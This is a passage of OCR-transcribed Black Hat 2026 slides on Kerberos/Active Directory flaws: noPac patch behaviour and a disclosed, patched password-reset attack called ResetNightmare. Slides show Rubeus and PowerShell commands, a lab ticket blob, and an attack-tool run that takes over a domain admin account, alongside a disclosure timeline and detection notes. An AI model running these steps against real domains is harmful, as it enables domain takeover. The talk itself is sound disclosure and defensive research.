ASREP (key) : 64F12CDDAA88057E@6A81B54E73B949B black
©2626
hat
```

## Slide 53

## Slide 54

## Slide 55

## PREVIOUS PATCH #2: CVE-2021-42287 Dollar Ticket / noPac

## Slide 56

### PREVIOUS PATCH #2: CVE-2021-42287

- TGTs always have a PAC

• PAC_REQUESTOR_SID

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PREVIOUS PATCH fa:
CVE-2021-4228'7
¢TGTs always have a PAC
PAC REQUESTOR SID
3.3.5.7 TGS Exchange
If the PAC_REQUESTOR SID is present in the PAC and the client is from the KDC’s realm, the KDC
MUST verify that the cname on the ticket resolves to an account with the same SID as the
PAC REQUESTOR SID (see section 3.3.5.6.1). If it does not, the KDC MUST return
KDC_ERR_TGT_REVOKED.
black hat
```

## Slide 57

### PREVIOUS PATCH #2: CVE-2021-42287

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PREVIOUS PATCH fa:
CVE-2021-4228'7
Decrypted PAC
(...)
ClientName :
Client Id : 7/6/2026 2:50:39 AM
[Client Name : DemoAdmin1 |
UpnDns :
DNS Domain Name : DEMO.LAB
[UPN : DemoAdmin1 |
Flags : (2) EXTENDED
SamName : UPNUser
Sid : S-1-5-21-2654527649 -3002338432-417080399-1116
Attributes -
AttributeLength |
AttributeFlags : (1) PAC_WAS_REQUESTED
Requestor ;
RequestorSID > S-1-5-21-2654527649-3002338432-417080399-1116
black hat
SA
202"
```

## Slide 58

### PREVIOUS PATCH #2: CVE-2021-42287

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PREVIOUS PATCH fa:
CVE-2021-4228'7
Decrypted PAC
(i)
ClientName
: 7/6/2026 2:50:39 AM
DistinguishedName
Client Id
Client Name : DemoAdmin1
UpnDns :
DNS Domain Name : DEMO.LAB
UPN : DemoAdmin1
Flags : (2) EXTENDED
SamName : UPNUser
Sid : S-1-5-21-2654527649 -3002338432-417080399-1116
Attributes ;
AttributeLength a2
AttributeFlags : (1) PAC_WAS_REQUESTED
Requestor ;
[RequestorSID : S-1-5-21-2654527649-3002338432-417080399-1116
Requestor :
RequestorSID : §-1-5-21-2654527649-3002338432-417080399-1116
PS C:\Users\notadmin\Desktop> Get-ADUser -Identity S-1-5-21-2654527649-3002338432-417080399-1116 |
>> select DistinguishedName, SamAccountName, UserPrincipalName
SamAccountName |UserPrincipalName
CN=UPNUser, CN=Users ,DC=demo, DC=lab| UPNUser DemoAdmin1
black hat
USA
2026
```

## Slide 59

### PREVIOUS PATCH #2: CVE-2021-42287

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PREVIOUS PATCH fa:
CVE-2021-4228'7
PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgs /ticket:$tgt /service:ldap/dc@1 /nowrap
[*] Action: Ask TGS
[*] Requesting default etypes (RC4_HMAC, AES[128/256] CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: ‘ldap/dce1'
[*] Using domain controller: DC@1.demo.lab (192.168.0.11)
[+] TGS request successful!
[*] base64(ticket.kirbi):
*
doIFOjCCBTagAwIBBaEDAgEWoolETzCCBEthggRHMI IEQ6ADAgEFOQObCERF TUSUTEFCohcwF aADAgECoQ4wDBs EbGRhcBsEZGMwMaOCBBUWwggQROAMCARKhAWIBAGKCBAMEggP/ 2W5
lp) lWeNWL jBhStWvIiFA2iAdfS6xdj4ydAtu3/wcO1Eokut1RnfLn2qgF+Upe2UxrRovwr 1peH1lqgVbKY1j9taKkek/ 1a7Z2PSH8R+my9QNXOFM61otAy J pVpetf pnASrMftCzhjcIPrnAFchnz|
qwnlAK/kfSiIBtv9/538uTkUrkIk5X8roHYtnbMLOgEdh3ZWyqi5BD52Adt7Ff612ia2sGINJSx16EV8yOLQo4rgy9MmGwGL 1kPHPqh@8xOnFmkSzP7 fxX8Ue6H8g3UQMO6RDSHLbzx164i9nh
PAkIJZOLDyMdIH8svhcEySV17zaVpe2tdjfhP3jeThErN75ch9njMLV9nTFebTICFNUNLWZODNX+Y6zgD5rtE/OcPw6L TDTq2ZIVU1xEbY@rKCExp0JSGCREuV2/BUiZSVNaZnAUCQF1bAADB3
rtp8yY3CPX7Pz5zkxuF8UGj6Li1M9ONFSAxrriAUkIe7RIEWKYWniswivl1aMImpIk748182K80i jgtkkHKO2frQTx1l1b73HhrVGhf4ZgvwkV3vCUOMcqOwgL pilSTBpdd4Uz3sx1jZ61fB3jh
IR71M4iQe9RdUrWMsPo1UZ6yCda+Y6H9q1abhE3doDbkdMQ9F nWL Tq2ZGgiGwi 7AKbeQK1EP 3dKauWVGR jUJ TtpBmamBvDLY j YO2wBTOpM1GsG1c67arh7cNGSSMckZIDOaTIIMNfOp+dezcn]]
INnSCPXTQ+KmNpSNwICY3LwkQ3qikvWAeuF zv5d3NIJpwor/9U8+/IXIZF6nFZN/rPJFCOGHT6BEOPG8RNZ8L8boB5yMK5b+VQiT LLDBtF8/@M6Hd6bW7ycCynFdMrCRUuBQEMSi TPEK9XYgRMZo
l42euxz7HJUL3ipOAmbgxQOm8KK 1Awy+qnSABzjC2HN2ret7durENCCcZ8cW2awPdT en68PUGd7/M6h7gGrS17T82GZG+kD1tH/RjULNGZD8kzBIZGgT4A5zng6cSRwusal eoMqVaeSdBVYPow
ICigcsEgch9gcUwgcKggb8wgbwwgbmgk ZApOAMCARKhI gQgh2/PIL2b5AhvirTkfqIqNGODOKzS5rsWbLSnUG2WX5zuhChs IREVNTy SMQUK iF ZAVOAMCAQGhD J AMGwpE ZW1VvQWRtaW4xowcDBQB
INz LyMTI1M1qnERgPMjAyNjA3MTQxMj EyYNTNaqgAobCERF TU8UTEFCGRCWFaADAgECOQ4wDBSEDGRhCBSEZGMWMQ==
ServiceName : Ildap/dce1
ServiceRealm : _DEMO.LAB
UserName : [DemoAdmin1 (NT_ENTERPRISE) |
UserRealm : DEMO.LAB
StartTime : 7/7/2026 5:14:23 AM
EndTime : 7/7/2026 3:12:53 PM
RenewTill : 7/14/2026 5:12:53 AM
Flags : mame_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
KeyType :  aes256_cts_hmac_sha1
Base64(key) : h2/PIL2b5AhvirTkfqIqNGODOKzSrswWbLSnUG2WX5zs=
re I
USA
black hat
```

## Slide 60

### PREVIOUS PATCH #2: CVE-2021-42287

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PREVIOUS PATCH fa:
CVE-2021-4228'7
ClientName :
Client Id : 7/7/2026 5:12:53 AM
Client Name : DemoAdmini
UpnDns :
DNS Domain Name : DEMO.LAB
UPN : DemoAdmini
Flags ; (2) EXTENDED
SamName : UPNUser
Sid : $-1-5-21-265452/649-3062338432-4A1/080399-1116
black hat
Qys4.
```

## Slide 61

### PREVIOUS PATCH #2: CVE-2021-42287

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PREVIOUS PATCH fa:
CVE-2021-4228'7
IPS C:\Users\notadmin\Desktop> Set-ADUser UPNUser -Clear UserPrincipalName
PS C:\Users\notadmin\Desktop> Get-ADObject -LD ilter “userprincipalname=DemoAdmin1*"
>> select DistinguishedName, SamAccountName, UserPrincipalName
DistinguishedName
ICN=DemoAdmin1 , OU=Admin,, DC=demo , DC=lab
SamAccountName UserPrincipalName
DemoAdmin1
DemoAdmini@demo. lab
IPS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgs /ticket:$tgt /service:ldap/dce@1 /nowrap
}_ /EIT IT) ~\I_ UII 1 W_)
11 \\ELIET IL) )—_I LI I |
II |_I__/|__/I] )__/(__/
v2.3.3
[*] Action: Ask TGS
[*] Requesting default etypes (RC4_HMAC, AES[128/256] CTS HMAC _SHA1) for the service ticket
[*] Building TGS-REQ request for: ‘ldap/dce1'
[*] Using domain controller: DC@1.demo.lab (192.168.0.11)
[X] KRB-ERROR (2@) :|KDC_ERR_TGT_REVOKED
s SamAccountName,UserPrincipalName |
black hat
@ys4
2026
```

## Slide 62

## Slide 63

### THE KERBEROS CHANGE PASSWORD PROTOCOL

•By default, every AD user can change their own password

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
THE KERBEROS CHANGE
PASSWORD PROTOCOL
«By default, every AD user can change their own
password
Q
|
/
1
message length
AP_REQ length
| prot
2
9G@12345678901234567898012345678901
4+-+-+-+-4+-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-
ocol version
+-+-4+-+-4+-4+-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4+-4-4-4+-4-4-4-
AP_REQ data
4+-+-+-+-4+-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-
KRB-PRIV message
+-+-4+-+-4+-4+-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-
3
+-+-+-+-+-+
number |
+-+-+-+-+-+
/
+-+-+-+-+-+
/
+-+-+-+-+-+
black hat
2026
```

## Slide 64

### THE KERBEROS CHANGE PASSWORD PROTOCOL

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
THE KERBEROS CHANGE
PASSWORD PROTOCOL
The user-data component of the message consists of the following
ASN.1 structure encoded as an OCTET STRING:
ChangePasswdData ::= SEQUENCE {
newpasswd[@] OCTET STRING,
targname[1] PrincipalName OPTIONAL,
targrealm[2] Realm OPTIONAL
}
black hat
2026
```

## Slide 65

### THE KERBEROS CHANGE PASSWORD PROTOCOL

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
THE KERBEROS CHANGE
PASSWORD PROTOCOL
AP-REQ ::= [APPLICATION 14] SEQUENCE {
pvno [@] INTEGER (5),
msg-type [1] INTEGER (14),
ap-options [2] APOptions,
ticket [3] Ticket,
authenticator [4] EncryptedData -- Authenticator
black hat
2026
```

## Slide 66

### THE KERBEROS CHANGE PASSWORD PROTOCOL

•Reminder: only the encryption key matters; this is just a TGT with the SPN changed to kadmin/changepw

## Slide 67

### THE KERBEROS CHANGE PASSWORD PROTOCOL

User
DC
TGT request (+ pre-authentication data)
TGT
Kerberos Change Password request (port 464)
SUCCESS

Build request message

## Slide 68

### THE KERBEROS CHANGE PASSWORD PROTOCOL

User

TGT-REQ ➜ AP-REQ No TGS-REQ!

DC

TGT request (+ pre-authentication data)

TGT

Build request message

Kerberos Change Password request (port 464)

SUCCESS

## Slide 69

Attacker
DC
The attacker has
WriteUPN on self
The attacker sets his UPN to the SamAccountName of the target account, e.g. Administrator
SamAccountName: Attacker
UserPrincipalName: Administrator
The attacker requests a TGT for Administrator with a name-type of NT-ENTERPRISE
TGT
Change the ticket’s
SPN to kadmin/changepw
Clear / Restore UPN
SamAccountName: Attacker
UserPrincipalName:
Reset password using the TGT for "Administrator"
Verify AP-REQ message
Can Administrator reset
own password?
Success?

## Slide 70

DEMO #4

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
© ® administrator: windows Pow X +
Ps C:\Users\Attacker\Desktop> hostname
Host1
Ps C:\Users\Attacker\Desktop> whoami
demo\attacker
Ps C:\Users\Attacker\Desktop> Get-ADUser attacker
Name MemberOf primarygroupid UserPrincipalName
attacker {} 513 attacker@demo. lab
PS C:\Users\Attacker\Desktop>
memberof, primarygroupid | select Name, MemberOf, primarygroupid , UserPrincipalName
```

## Slide 71

# ResetNightmare CVE-2026-27912

## Slide 72

ResetNightmare: CVE-2026-27912

If an attacker could write to any user/computer, or create a new one*, **they could compromise the entire domain** .

* (not with MachineAccountQuota)

•Bonus – can be combined with ShadowCreds

## Slide 73

### DISCLOSURE TIMELINE

- November 26, 2025: reported KerberLoss

- December 17, 2025: reported ResetNightmare

- January 9, 2026: MSRC confirms ResetNightmare works as reported

- January 17, 2026: MSRC confirms KerberLoss works as reported

- March 10, 2026: Microsoft patches KerberLoss

- April 14, 2026: Microsoft patches ResetNightmare

## Slide 74

### MITIGATION

•KerberLoss – Patched on March 2026 •ResetNightmare – Patched on April 2026

## Slide 75

DETECTION

## Slide 76

### DETECTION - KerberLoss

5136

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DETECTION - KerberLoss
black hat
USA
2026
```

## Slide 77

### DETECTION - ResetNightmare

5136

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DETECTION - ResetNightmare
was modified,
Directo
Object:
DN:
GUID:
black hat
USA
2026
```

## Slide 78

### DETECTION - ResetNightmare

5136

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DETECTION - ResetNightmare
A directory servic | was modifie
Directo
ication © orrelati on ID:
black hat
USA
2026
```

## Slide 79

DETECTION - ResetNightmare

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DETECTION - ResetNightmare
ia] Event Properties - Ev
neral Details
nt Domain:
ional Information:
Pri
Information
N,
Info
black hat
2026
```

## Slide 80

### ResetNighmare tool

<u>https://github.com/Semperis-Community/ ResetNightmare</u>

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ResetNighmare tool
https://github.com/Semperis-Community/
ResetNightmare
PS> Invoke-ResetNightmare -TargetAccount DemoAdmin1 -TargetNewPassword toolPassword1 -UPNUser pocUser -UPNUserPassword Password1
>> -CreateNewPath "OU=test ,DC=demo,DC=lab" -DC DCe1
[*] Creating user pocUser in OU=test,DC=demo,DC=lab...
[*] Getting Full Control rights on pocUser for notadmin
[*] Resetting pocUser's password to Password1
[*] Enabling pocUser...
[*] Setting a fake UPN for pocUser...
[*] Asking for a TGT for pocUser with the name DemoAdmin1 (NT_ENTERPRISE) for kadmin/changepw...
[*] Clearing fake UPN from pocUser...
[*] Attempting to change DemoAdmini's password to toolPassword1...
[*] Cleaning up files...
Success! You can now authenticate as DemoAdmin1 with the password toolPassword1
To spawn a new netonly process:
Rubeus.exe asktgt /user:DemoAdmini1 /password:toolPassword1 /suppenctype:AES256 /nowrap /createnetonly:cmd.exe /show
black hat
USA
2026
```

## Slide 81

### ACKNOWLEDGEMENTS

•Yossi Sassi (@Yossi_Sassi) •Andrew Bartlett •Elad Shamir (@elad_shamir) •Charlie Clark (@exploitph) •Will Schroeder (@harmj0y) •Andrea Pierini (@decoder_it) •Benjamin Delpy (@gentilkiwi)

## Slide 82

### KEY TAKEAWAYS

•Stick to the Principle of Least Privilege •Don’t assume “Tier-0” == “Zero threat” •Researchers: Stay curious

## Slide 83

#### To read our full write-up:

Thank you! Questions?
